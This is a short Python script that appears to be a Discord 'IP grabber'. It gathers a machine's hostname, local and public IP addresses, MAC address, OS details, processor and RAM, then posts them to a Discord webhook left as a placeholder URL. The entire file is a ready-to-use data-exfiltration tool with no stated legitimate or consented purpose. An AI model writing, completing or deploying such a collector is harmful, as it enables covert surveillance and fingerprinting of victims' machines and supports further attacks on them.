import socket
import platform,socket,re,uuid,json,psutil,logging
from discord_webhook import DiscordWebhook
from requests import get

def getSystemInfo():
    try:
        info={}
        info['Platform']=platform.system()
        info['Platform-Release']=platform.release()
        info['Platform-Version']=platform.version()
        info['Architecture']=platform.machine()
        info['Hostname']=socket.gethostname()
        info['Mac-Address']=':'.join(re.findall('..', '%012x' % uuid.getnode()))
        info['Processor']=platform.processor()
        info['Ram']=str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"
        return json.dumps(info)
    except Exception as e:
        logging.exception(e)

hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)
ip = get('https://api.ipify.org').text

webhook = DiscordWebhook(
      url='yout webhook',
      content=f"```Hostname: {hostname}```\n```IP Address: {ip_address}```\n```Public IP Address: {ip}```\n```\n{getSystemInfo()}```\n",
)

response = webhook.execute()
